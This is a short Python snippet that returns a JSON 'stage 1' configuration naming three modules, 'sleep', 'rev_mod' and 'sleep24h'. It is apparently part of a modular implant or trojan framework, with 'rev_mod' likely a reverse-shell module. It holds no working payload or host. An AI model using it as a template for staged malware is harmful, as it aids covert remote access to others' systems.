
import json

def run(**args):
    print('[$] Enter stage 1')
    basic_config =json.dumps([{"module" : "sleep"},{"module" : "rev_mod"}, {"module" : "sleep24h"}])
    return basic_config
                        
